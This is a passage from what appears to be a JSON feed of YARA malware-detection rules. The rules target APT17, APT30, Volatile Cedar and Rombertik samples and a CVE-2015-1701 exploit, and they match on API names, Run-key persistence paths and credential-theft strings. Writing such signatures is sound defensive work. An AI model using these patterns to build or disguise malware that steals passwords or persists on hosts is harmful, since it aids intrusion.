$s4 = \"VirtualProtect\" \n      $s5 = \"HeapAlloc\" \n      $s6 = \"GetProcessHeap\" \n      $s7 = \"GetCommandLine\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( all of ( $x* ) or all of ( $y* ) ) and all of ( $s* )\n}","date":"2015-05-14 11:09:21","description":"Detects Samples related to APT17 activity - file FXSST.DLL","minimum_yara":"1.7","name":"APT17_Sample_FXSST_DLL_RID2E51","reference":"https://goo.gl/ZiJyQv","required_modules":[],"rule_hash":"2ac052f29ea53de7a58b4b73502d2229","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule CVE_2015_1701_Taihou_RID2D07 : DEMO EXE EXPLOIT FILE T1068 {\n   meta:\n      description = \"CVE-2015-1701 compiled exploit code\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/W4nU0q\"\n      date = \"2015-05-13 10:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"VirtualProtect\" fullword\n      $s4 = \"RegisterClass\" \n      $s5 = \"LoadIcon\" \n      $s6 = \"PsLookupProcessByProcessId\" fullword ascii\n      $s7 = \"LoadLibraryExA\" fullword ascii\n      $s8 = \"gSharedInfo\" fullword\n      $w1 = \"user32.dll\" wide\n      $w2 = \"ntdll\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of ( $s* ) and 1 of ( $w* )\n}","date":"2015-05-13 10:14:21","description":"CVE-2015-1701 compiled exploit code","minimum_yara":"1.7","name":"CVE_2015_1701_Taihou_RID2D07","reference":"http://goo.gl/W4nU0q","required_modules":[],"rule_hash":"4f0ae821c6a1fd5990289a3bc506f3a0","score":70,"tags":["EXPLOIT","DEMO","EXE","FILE","T1068"]},{"author":"Florian Roth","content":"rule MAL_Rombertik_CarbonGrabber_RID3162 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CarbonGrabber alias Rombertik - file Copy#064046.scr\"\n      author = \"Florian Roth\"\n      reference = \"http://blogs.cisco.com/security/talos/rombertik\"\n      date = \"2015-05-05 13:20:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ZwGetWriteWatch\" fullword ascii\n      $x2 = \"OutputDebugStringA\" fullword ascii\n      $x3 = \"malwar\" fullword ascii\n      $x4 = \"sampl\" fullword ascii\n      $x5 = \"viru\" fullword ascii\n      $x6 = \"sandb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and all of them\n}","date":"2015-05-05 13:20:11","description":"Detects CarbonGrabber alias Rombertik - file Copy#064046.scr","minimum_yara":"1.7","name":"MAL_Rombertik_CarbonGrabber_RID3162","reference":"http://blogs.cisco.com/security/talos/rombertik","required_modules":[],"rule_hash":"9ead69ddd32e5db41809c3996151cdda","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Rombertik_CarbonGrabber_Builder_Server_RID375E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CarbonGrabber alias Rombertik Builder Server - file Server.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://blogs.cisco.com/security/talos/rombertik\"\n      date = \"2015-05-05 17:35:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" fullword ascii\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\Currentversion\\\\RunOnce\" fullword ascii\n      $s4 = \"chrome.exe\" fullword ascii\n      $s5 = \"firefox.exe\" fullword ascii\n      $s6 = \"chrome.dll\" fullword ascii\n      $s7 = \"@KERNEL32.DLL\" fullword wide\n      $s8 = \"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome\" ascii\n      $s10 = \"&post=\" fullword ascii\n      $s11 = \"&host=\" fullword ascii\n      $s12 = \"Ws2_32.dll\" fullword ascii\n      $s16 = \"&browser=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 8 of them\n}","date":"2015-05-05 17:35:31","description":"Detects CarbonGrabber alias Rombertik Builder Server - file Server.exe","minimum_yara":"1.7","name":"MAL_Rombertik_CarbonGrabber_Builder_Server_RID375E","reference":"http://blogs.cisco.com/security/talos/rombertik","required_modules":[],"rule_hash":"58ae753ac4f58140e43888ca3e27b1c5","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT30_Generic_B_RID2C16 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 29395c528693b69233c1c12bef8a64b3\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Moziea/4.0\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:11","description":"FireEye APT30 Report Sample - file 29395c528693b69233c1c12bef8a64b3","minimum_yara":"1.7","name":"APT30_Generic_B_RID2C16","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"a0534ff9c4f277fb354c2f7b3f58fbc8","score":85,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule Explosion_Sample_1_RID2E23 : APT DEMO FILE MAL MIDDLE_EAST T1112 {\n   meta:\n      description = \"Explosion/Explosive Malware - Volatile Cedar APT - file b74bd5660baf67038353136978ed16dbc7d105c60c121cf64c61d8f3d31de32c\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/5vYaNb\"\n      date = \"2015-04-03 11:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, MIDDLE_EAST, T1112\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"REG ADD \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii\n      $s9 = \"WinAutologon From Winlogon Reg\" fullword ascii\n      $s10 = \"82BD0E67-9FEA-4748-8672-D5EFE5B779B0\" fullword ascii\n      $s11 = \"IE:Password-Protected sites\" fullword ascii\n      $s12 = \"\\\\his.sys\" fullword ascii\n      $s13 = \"HTTP Password\" fullword ascii\n      $s14 = \"\\\\data.sys\" fullword ascii\n      $s15 = \"EL$_RasDefaultCredentials#0\" fullword wide\n      $s17 = \"Office Outlook HTTP\" fullword ascii\n      $s20 = \"Hist :<b> %ws</b>  :%s </br></br>\" fullword ascii\n   condition: \n      all of them and uint16 ( 0 ) == 0x5A4D\n}","date":"2015-04-03 11:01:41","description":"Explosion/Explosive Malware - Volatile Cedar APT - file b74bd5660baf67038353136978ed16dbc7d105c60c121cf64c61d8f3d31de32c","minimum_yara":"1.7","name":"Explosion_Sample_1_RID2E23","reference":"http://goo.gl/5vYaNb","required_modules":[],"rule_hash":"2ec656e895da7bc6fdf8dd4f138d1418","score":70,"tags":["MAL","DEMO","T1112","FILE","MIDDLE_EAST","APT"]},{"author":"Florian Roth","content":"rule Explosion_Sample_2_RID2E24 : APT DEMO FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Explosion/Explosive Malware - Volatile Cedar APT - file bfc63b30624332f4fc2e510f95b69d18dd0241eb0d2fcd33ed2e81b7275ab488\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/5vYaNb\"\n      date = \"2015-04-03 11:01:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"serverhelp.dll\" fullword wide\n      $s1 = \"Windows Help DLL\" fullword wide\n      $s5 = \"SetWinHoK\" fullword ascii\n   condition: \n      all of them and uint16 ( 0 ) == 0x5A4D\n}","date":"2015-04-03 11:01:51","description":"Explosion/Explosive Malware - Volatile Cedar APT - file bfc63b30624332f4fc2e510f95b69d18dd0241eb0d2fcd33ed2e81b7275ab488","minimum_yara":"1.7","name":"Explosion_Sample_2_RID2E24","reference":"http://goo.gl/5vYaNb","required_modules":[],"rule_hash":"025241ffc1ca87df0d5a25aa730802a1","score":70,"tags":["APT","DEMO","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule Explosion_Generic_1_RID2E7E : APT DEMO FILE GEN MAL MIDDLE_EAST T1091 {\n   meta:\n      description = \"Generic Rule for Explosion/Explosive Malware - Volatile Cedar APT - Autorun\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-04-03 11:16:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN, MAL, MIDDLE_EAST, T1091\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"autorun.exe\" fullword\n      $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CL\" \n      $s2 = \"%drp.exe\" fullword\n      $s3 = \"%s_%s%d.exe\" fullword\n      $s4 = \"open=autorun.exe\" fullword\n      $s5 = \"http://www.microsoft.com/en-us/default.aspx\" fullword\n      $s10 = \"error.renamefile\" fullword\n      $s12 = \"insufficient lookahead\" fullword\n      $s13 = \"%s %s|\" fullword\n      $s16 = \":\\\\autorun.exe\" fullword\n   condition: \n      7 of them and uint16 ( 0 ) == 0x5A4D\n}","date":"2015-04-03 11:16:51","description":"Generic Rule for Explosion/Explosive Malware - Volatile Cedar APT - Autorun","minimum_yara":"1.7","name":"Explosion_Generic_1_RID2E7E","reference":"not set","required_modules":[],"rule_hash":"7176189d78db9acf3f2e25d4f8a78839","score":70,"tags":["MAL","DEMO","FILE","MIDDLE_EAST","APT","GEN","T1091"]},{"author":"Florian Roth","content":"rule APT30_Generic_H_RID2C1C : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file db3e5c2f2ce07c2d3fa38d6fc1ceb854\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Temp1020.txt\" fullword ascii\n      $s1 = \"Xmd.Txe\" fullword ascii\n      $s2 = \"\\\\Internet Exp1orer\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:35:11","description":"FireEye APT30 Report Sample - file db3e5c2f2ce07c2d3fa38d6fc1ceb854","minimum_yara":"1.7","name":"APT30_Generic_H_RID2C1C","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"afec35d66fa2b1735045e03f20b988d8","score":85,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_2_RID2BAB : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file c4dec6d69d8035d481e4f2c86f580e81\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ForZRLnkWordDlg.EXE\" fullword wide\n      $s1 = \"ForZRLnkWordDlg Microsoft \" fullword wide\n      $s9 = \"ForZRLnkWordDlg 1.0 \" fullword wide\n      $s11 = \"ForZRLnkWordDlg\" fullword wide\n      $s12 = \" (C) 2011\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:16:21","description":"FireEye APT30 Report Sample - file c4dec6d69d8035d481e4f2c86f580e81","minimum_yara":"1.7","name":"APT30_Sample_2_RID2BAB","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"3333c6d5755d334a287d3a013c6953db","score":85,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_3_RID2BAC : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 59e055cee87d8faf6f701293e5830b5a\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"Software\\\\Mic\" ascii\n      $s6 = \"HHOSTR\" ascii\n      $s9 = \"ThEugh\" fullword ascii\n      $s10 = \"Moziea/\" ascii\n      $s12 = \"%s%s(X-\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:16:31","description":"FireEye APT30 Report Sample - file 59e055cee87d8faf6f701293e5830b5a","minimum_yara":"1.7","name":"APT30_Sample_3_RID2BAC","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"78a32fff1fde9b722ace5ed7e10bd31e","score":85,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_C_RID2C17 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 0c4fcef3b583d0ffffc2b14b9297d3a4\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MYUSER32.dll\" fullword ascii\n      $s1 = \"MYADVAPI32.dll\" fullword ascii\n      $s2 = \"MYWSOCK32.dll\" fullword ascii\n      $s3 = \"MYMSVCRT.dll\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:21","description":"FireEye APT30 Report Sample - file 0c4fcef3b583d0ffffc2b14b9297d3a4","minimum_yara":"1.7","name":"APT30_Generic_C_RID2C17","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"2879b2af568ca54a3348416e449f189c","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_4_RID2BAD : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 6ba315275561d99b1eb8fc614ff0b2b3\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetStartupIn\" ascii\n      $s1 = \"enMutex\" ascii\n      $s2 = \"tpsvimi\" ascii\n      $s3 = \"reateProcesy\" ascii\n      $s5 = \"FreeLibr1y*S\" ascii\n      $s6 = \"foAModuleHand\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:16:41","description":"FireEye APT30 Report Sample - file 6ba315275561d99b1eb8fc614ff0b2b3","minimum_yara":"1.7","name":"APT30_Sample_4_RID2BAD","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"8c85fd66417d880198fcc7237800fa69","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_5_RID2BAE : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file ebf42e8b532e2f3b19046b028b5dfb23\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n      $s3 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n      $s7 = \"msmsgs\" fullword wide\n      $s10 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:16:51","description":"FireEye APT30 Report Sample - file ebf42e8b532e2f3b19046b028b5dfb23","minimum_yara":"1.7","name":"APT30_Sample_5_RID2BAE","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"f658f116c06cac879213d69e8f669b40","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_6_RID2BAF : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file ee1b23c97f809151805792f8778ead74\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GreateProcessA\" fullword ascii\n      $s1 = \"Ternel32.dll\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:17:01","description":"FireEye APT30 Report Sample - file ee1b23c97f809151805792f8778ead74","minimum_yara":"1.7","name":"APT30_Sample_6_RID2BAF","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"05282a8a968e6797220b07b7b437f6c7","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_7_RID2BB0 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 74b87086887e0c67ffb035069b195ac7\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"datain\" fullword ascii\n      $s3 = \"C:\\\\Prog\" ascii\n      $s4 = \"$LDDATA$\" ascii\n      $s5 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s6 = \"Jean-loup Gailly\" ascii\n      $s8 = \"deflate 1.1.3 Copyright\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:17:11","description":"FireEye APT30 Report Sample - file 74b87086887e0c67ffb035069b195ac7","minimum_yara":"1.7","name":"APT30_Sample_7_RID2BB0","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"b35e34d35f51e98f02aa47039ea1a7f6","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_E_RID2C19 : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 8ff473bedbcc77df2c49a91167b1abeb\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Nkfvtyvn}\" ascii\n      $s6 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:34:41","description":"FireEye APT30 Report Sample - file 8ff473bedbcc77df2c49a91167b1abeb","minimum_yara":"1.7","name":"APT30_Generic_E_RID2C19","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"e4a30568e98b12f3718e850d7ee35d97","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_8_RID2BB1 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 44b98f22155f420af4528d17bb4a5ec8\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ateProcessA\" ascii\n      $s1 = \"Ternel32.dllFQ\" fullword ascii\n      $s2 = \"StartupInfoAModuleHand\" fullword ascii\n      $s3 = \"OpenMutex\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:17:21","description":"FireEye APT30 Report Sample - file 44b98f22155f420af4528d17bb4a5ec8","minimum_yara":"1.7","name":"APT30_Sample_8_RID2BB1","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"9c3cff51e5b163f9b9a1ffda24048705","score":65,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Generic_I_RID2C1D : APT DEMO FILE GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample - file fe211c7a081c1dac46e3935f7c614549\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Copyright 2012 Google Inc. All rights reserved.\" fullword wide\n      $s1 = \"(Prxy%c-%s:%u)\" fullword ascii\n      $s2 = \"Google Inc.\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:35:21","description":"FireEye APT30 Report Sample - file fe211c7a081c1dac46e3935f7c614549","minimum_yara":"1.7","name":"APT30_Generic_I_RID2C1D","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"3443195777e0c12a1a59b13b3def6bee","score":65,"tags":["APT","DEMO","GEN","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_9_RID2BB2 : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file e3ae3cbc024e39121c87d73e87bb2210\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Windo\" ascii\n      $s2 = \"oHHOSTR\" ascii\n      $s3 = \"Softwa]\\\\Mic\" ascii\n      $s4 = \"Startup'T\" ascii\n      $s6 = \"Ora\\\\%^\" ascii\n      $s7 = \"\\\\Ohttp=r\" ascii\n      $s17 = \"help32Snapshot0L\" ascii\n      $s18 = \"TimUmoveH\" ascii\n      $s20 = \"WideChc[lobalAl\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:17:31","description":"FireEye APT30 Report Sample - file e3ae3cbc024e39121c87d73e87bb2210","minimum_yara":"1.7","name":"APT30_Sample_9_RID2BB2","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"c890bfe8b5df7a67ddaab42857af47a6","score":85,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_10_RID2BDA : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file 8c713117af4ca6bbd69292a78069e75b\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n      $s2 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n      $s3 = \"!! Use Connect Method !!\" fullword ascii\n      $s4 = \"(Prxy%c-%s:%u)\" fullword ascii\n      $s5 = \"msmsgs\" fullword wide\n      $s18 = \"(Prxy-No)\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:11","description":"FireEye APT30 Report Sample - file 8c713117af4ca6bbd69292a78069e75b","minimum_yara":"1.7","name":"APT30_Sample_10_RID2BDA","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"f1ad8a3c0803f9d74c27eacd1c96c51a","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_11_RID2BDB : APT DEMO FILE T1050 {\n   meta:\n      description = \"FireEye APT30 Report Sample - file d97aace631d6f089595f5ce177f54a39\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System\\\\CurrentControlSet\\\\control\\\\ComputerName\\\\ComputerName\" fullword ascii\n      $s1 = \"msofscan.exe\" fullword wide\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 5.0; Win32)\" fullword ascii\n      $s3 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n      $s4 = \"Windows XP Professional x64 Edition or Windows Server 2003\" fullword ascii\n      $s9 = \"NetEagle_Scout - \" fullword ascii\n      $s10 = \"Server 4.0, Enterprise Edition\" fullword ascii\n      $s11 = \"Windows 3.1(Win32s)\" fullword ascii\n      $s12 = \"%s%s%s %s\" fullword ascii\n      $s13 = \"Server 4.0\" fullword ascii\n      $s15 = \"Windows Millennium Edition\" fullword ascii\n      $s16 = \"msofscan\" fullword wide\n      $s17 = \"Eagle-Norton360-OfficeScan\" fullword ascii\n      $s18 = \"Workstation 4.0\" fullword ascii\n      $s19 = \"2003 Microsoft Office system\" fullword wide\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}","date":"2015-04-03 09:24:21","description":"FireEye APT30 Report Sample - file d97aace631d6f089595f5ce177f54a39","minimum_yara":"1.7","name":"APT30_Sample_11_RID2BDB","reference":"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf","required_modules":[],"rule_hash":"14ca1d119f921ebb0a551287ab221272","score":65,"tags":["APT","DEMO","T1050","FILE"]},{"author":"Florian Roth","content":"rule APT30_Sample_12_RID2BDC : APT DEMO FILE {\n   meta:\n      description = \"FireEye APT30 Report Sample - file c95cd106c1fecbd500f4b97566d8dc96\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = 